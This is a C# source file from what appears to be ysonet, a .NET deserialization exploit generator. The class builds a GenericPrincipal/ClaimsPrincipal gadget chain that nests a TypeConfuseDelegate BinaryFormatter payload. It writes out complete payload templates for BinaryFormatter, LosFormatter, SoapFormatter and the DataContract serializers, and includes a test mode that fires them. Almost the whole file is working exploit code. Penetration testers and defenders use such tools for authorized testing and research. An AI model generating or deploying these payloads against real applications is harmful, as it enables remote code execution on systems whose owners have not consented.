using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using ysonet.Helpers;
using ysonet.Helpers.ModifiedVulnerableBinaryFormatters;

namespace ysonet.Generators
{
    public class GenericPrincipalGenerator : GenericGenerator
    {
        // Discovery facets (category search only): second-order BinaryFormatter sink
        // carried in GenericPrincipal/ClaimsIdentity (mscorlib, built-in). Both
        // variants share this capability.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.NestedDeserialization)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // reaches the 4.5+ ClaimsPrincipal sink; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
        }

        int variant_number = 1;
        public override List<string> SupportedFormatters()
        {
            // The "(N)" suffix is a display-only annotation meaning "this formatter
            // carries N variants". The DataContract serializers have no suffix because
            // they always use the ClaimsPrincipal identities sink; the variant option
            // only changes the BinaryFormatter/LosFormatter/SoapFormatter graphs (see
            // the note below).
            return new List<string> { "BinaryFormatter (2)", "SoapFormatter (2)", "DataContractSerializer", "DataContractJsonSerializer", "NetDataContractSerializer", "LosFormatter (2)" };
        }

        // The DataContract serializers import ClaimsPrincipal as a BASE data contract, so the
        // sink member m_serializedClaimsIdentities sits in the Security.Claims contract namespace
        // while the root element is in the Principal namespace. GenericPrincipal's own fields
        // m_identity and m_roles are required derived-contract members and are emitted null. These
        // paths use the ClaimsPrincipal identities sink (the variant option only affects the
        // BinaryFormatter/LosFormatter/SoapFormatter graphs).
        private const string MscorlibAssembly = "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        private const string PrincipalContractNs = "http://schemas.datacontract.org/2004/07/System.Security.Principal";
        private const string ClaimsContractNs = "http://schemas.datacontract.org/2004/07/System.Security.Claims";

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                new GadgetVariant(1, "payload in m_serializedClaimsIdentities (default)"),
                new GadgetVariant(2, "payload in ClaimsIdentity m_serializedClaims")
            };
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Bridged, GadgetTags.OnDeserialized, GadgetTags.SecondOrderDeserialization }; //inherits ClaimsPrincipal
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Payload variant number where applicable. Choices: 1 (uses serialized ClaimsIdentities), 2 (uses serialized Claims)", v => int.TryParse(v, out variant_number) },
            };

            return options;
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                binaryFormatterPayload = (byte[])new TypeConfuseDelegateGenerator().GenerateInner("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
            string bfPayload1 = "";
            string bfPayload2 = "";

            if (variant_number == 1)
            {
                bfPayload1 = b64encoded;
            }
            else
            {
                bfPayload2 = b64encoded;
            }

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                string payload_bf_json = @"[{""Id"": 1,
    ""Data"": {
      ""$type"": ""SerializationHeaderRecord"",
      ""binaryFormatterMajorVersion"": 1,
      ""binaryFormatterMinorVersion"": 0,
      ""binaryHeaderEnum"": 0,
      ""topId"": 1,
      ""headerId"": -1,
      ""majorVersion"": 1,
      ""minorVersion"": 0
}},{""Id"": 2,
    ""TypeName"": ""ObjectWithMapTyped"",
    ""Data"": {
      ""$type"": ""BinaryObjectWithMapTyped"",
      ""binaryHeaderEnum"": 4,
      ""objectId"": 1,
      ""name"": ""System.Security.Principal.GenericPrincipal"",
      ""numMembers"": 4,
      ""memberNames"":[""m_identity"",""m_roles"",""ClaimsPrincipal+m_version"",""ClaimsPrincipal+m_serializedClaimsIdentities""],
      ""binaryTypeEnumA"":[3,6,1,1],
      ""typeInformationA"":[null,null,null,null],
      ""typeInformationB"":[""System.Security.Claims.ClaimsIdentity"",null,null,null],
      ""memberAssemIds"":[0,0,0,0],
      ""assemId"": 0
}},{""Id"": 3,
    ""TypeName"": ""MemberReference"",
    ""Data"": {
      ""$type"": ""MemberReference"",
      ""idRef"": 2
}},{""Id"": 4,
    ""TypeName"": ""MemberReference"",
    ""Data"": {
      ""$type"": ""MemberReference"",
      ""idRef"": 3
}},{""Id"": 5,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 4,
      ""value"": ""1.0""
}},{""Id"": 6,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 5,
      ""value"": """ + bfPayload1 + @"""
}},{""Id"": 7,
    ""TypeName"": ""ObjectWithMapTyped"",
    ""Data"": {
      ""$type"": ""BinaryObjectWithMapTyped"",
      ""binaryHeaderEnum"": 4,
      ""objectId"": 2,
      ""name"": ""System.Security.Claims.ClaimsIdentity"",
      ""numMembers"": 8,
      ""memberNames"":[""m_version"",""m_actor"",""m_authenticationType"",""m_bootstrapContext"",""m_label"",""m_serializedNameType"",""m_serializedRoleType"",""m_serializedClaims""],
      ""binaryTypeEnumA"":[1,3,1,2,1,1,1,1],
      ""typeInformationA"":[null,null,null,null,null,null,null,null],
      ""typeInformationB"":[null,""System.Security.Claims.ClaimsIdentity"",null,null,null,null,null,null],
      ""memberAssemIds"":[0,0,0,0,0,0,0,0],
      ""assemId"": 0
}},{""Id"": 8,
    ""TypeName"": ""MemberReference"",
    ""Data"": {
      ""$type"": ""MemberReference"",
      ""idRef"": 4
}},{""Id"": 9,
    ""TypeName"": ""ObjectNull"",
    ""Data"": {
      ""$type"": ""ObjectNull"",
      ""nullCount"": 1
}},{""Id"": 10,
    ""TypeName"": ""ObjectNull"",
    ""Data"": {
      ""$type"": ""ObjectNull"",
      ""nullCount"": 1
}},{""Id"": 11,
    ""TypeName"": ""ObjectNull"",
    ""Data"": {
      ""$type"": ""ObjectNull"",
      ""nullCount"": 1
}},{""Id"": 12,
    ""TypeName"": ""ObjectNull"",
    ""Data"": {
      ""$type"": ""ObjectNull"",
      ""nullCount"": 1
}},{""Id"": 13,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 7,
      ""value"": ""http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name""
}},{""Id"": 14,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 8,
      ""value"": ""http://schemas.microsoft.com/ws/2008/06/identity/claims/role""
}},{""Id"": 15,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 9,
      ""value"": """ + bfPayload2 + @"""
}},{""Id"": 16,
    ""TypeName"": ""ArraySingleString"",
    ""Data"": {
      ""$type"": ""BinaryArray"",
      ""objectId"": 3,
      ""rank"": 1,
      ""lengthA"":[0],
      ""lowerBoundA"":[0],
      ""binaryTypeEnum"": 1,
      ""typeInformation"": null,
      ""assemId"": 0,
      ""binaryHeaderEnum"": 17,
      ""binaryArrayTypeEnum"": 0
}},{""Id"": 19,
    ""TypeName"": ""MessageEnd"",
    ""Data"": {
      ""$type"": ""MessageEnd""
}}]";

                MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(payload_bf_json);

                if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
                {
                    if (inputArgs.Test)
                    {
                        try
                        {
                            ms.Position = 0;
                            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                            bf.Deserialize(ms);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return ms.ToArray();
                }
                else
                {
                    // it is LosFormatter
                    byte[] lfSerializedObj = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms.ToArray());

                    MemoryStream ms2 = new MemoryStream(lfSerializedObj);
                    ms2.Position = 0;
                    if (inputArgs.Test)
                    {
                        try
                        {
                            System.Web.UI.LosFormatter lf = new System.Web.UI.LosFormatter();
                            lf.Deserialize(ms2);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return lfSerializedObj;
                }
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {
                // GenericPrincipal (System.Security.Principal, mscorlib) derives from
                // ClaimsPrincipal. It is [Serializable] and not ISerializable, so the same
                // field-based OnDeserialized sinks as the BinaryFormatter path apply. Because
                // GenericPrincipal is a derived type, FormatterServices exposes inherited base
                // fields under the prefixed name "<BaseType>+<field>"; SoapFormatter XML-encodes
                // the plus sign as "_x002B_".
                string payload;

                // Unlike ClaimsPrincipal (whose fields are [OptionalField]), GenericPrincipal
                // adds two required fields (m_identity, m_roles), so SoapFormatter rejects the
                // object unless ALL four serializable members are present. The two non-payload
                // inherited fields and the unused own fields are emitted as xsi:null.
                if (variant_number == 2)
                {
                    // Variant 2: the inner BF payload rides the identity's
                    // ClaimsIdentity.m_serializedClaims. GenericPrincipal.m_identity references
                    // a ClaimsIdentity object whose own OnDeserialized callback fires the sink
                    // (the cast to List<Claim> throws only after firing).
                    payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
<a1:GenericPrincipal id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/ns/System.Security.Principal"">
<m_identity href=""#ref-2""/>
<m_roles xsi:null=""1""/>
<ClaimsPrincipal_x002B_m_version xsi:null=""1""/>
<ClaimsPrincipal_x002B_m_serializedClaimsIdentities xsi:null=""1""/>
</a1:GenericPrincipal>
<a2:ClaimsIdentity id=""ref-2"" xmlns:a2=""http://schemas.microsoft.com/clr/ns/System.Security.Claims"">
<m_serializedClaims id=""ref-3"">{b64encoded}</m_serializedClaims>
</a2:ClaimsIdentity>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";
                }
                else
                {
                    // Variant 1 (default): the inner BF payload rides the inherited
                    // ClaimsPrincipal.m_serializedClaimsIdentities. ClaimsPrincipal.OnDeserialized
                    // base64-decodes it and runs a nested BinaryFormatter, which fires before the
                    // cast to List<string>.
                    payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
<a1:GenericPrincipal id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/ns/System.Security.Principal"">
<m_identity xsi:null=""1""/>
<m_roles xsi:null=""1""/>
<ClaimsPrincipal_x002B_m_version xsi:null=""1""/>
<ClaimsPrincipal_x002B_m_serializedClaimsIdentities id=""ref-5"">{b64encoded}</ClaimsPrincipal_x002B_m_serializedClaimsIdentities>
</a1:GenericPrincipal>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";
                }

                if (inputArgs.Minify)
                {
                    payload = XmlMinifier.Minify(payload, null, null, FormatterType.SoapFormatter);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                string payload = $@"<root type=""System.Security.Principal.GenericPrincipal, {MscorlibAssembly}"">
<GenericPrincipal xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns=""{PrincipalContractNs}"">
<m_serializedClaimsIdentities xmlns=""{ClaimsContractNs}"">{b64encoded}</m_serializedClaimsIdentities>
<m_identity i:nil=""true""/>
<m_roles i:nil=""true""/>
</GenericPrincipal>
</root>";
                if (inputArgs.Minify)
                {
                    payload = inputArgs.UseSimpleType ? XmlMinifier.Minify(payload, new string[] { "mscorlib" }, null) : XmlMinifier.Minify(payload, null, null);
                }
                if (inputArgs.Test)
                {
                    try { SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type"); }
                    catch (Exception err) { Debugging.ShowErrors(inputArgs, err); }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {
                string payload = $@"<GenericPrincipal xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Id=""1"" z:Type=""System.Security.Principal.GenericPrincipal"" z:Assembly=""0"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns=""{PrincipalContractNs}"">
<m_serializedClaimsIdentities z:Id=""2"" xmlns=""{ClaimsContractNs}"">{b64encoded}</m_serializedClaimsIdentities>
<m_identity i:nil=""true""/>
<m_roles i:nil=""true""/>
</GenericPrincipal>
";
                if (inputArgs.Minify)
                {
                    payload = inputArgs.UseSimpleType ? XmlMinifier.Minify(payload, new string[] { "mscorlib" }, null) : XmlMinifier.Minify(payload, null, null);
                }
                if (inputArgs.Test)
                {
                    try { SerializersHelper.NetDataContractSerializer_deserialize(payload); }
                    catch (Exception err) { Debugging.ShowErrors(inputArgs, err); }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractjsonserializer"))
            {
                string payload = $@"{{""m_serializedClaimsIdentities"":""{b64encoded}"",""m_identity"":null,""m_roles"":null}}";
                if (inputArgs.Minify)
                {
                    payload = inputArgs.UseSimpleType ? JsonMinifier.Minify(payload, new string[] { "mscorlib" }, null) : JsonMinifier.Minify(payload, null, null);
                }
                if (inputArgs.Test)
                {
                    try { SerializersHelper.DataContractJsonSerializer_deserialize(payload, "System.Security.Principal.GenericPrincipal, " + MscorlibAssembly, null); }
                    catch (Exception err) { Debugging.ShowErrors(inputArgs, err); }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
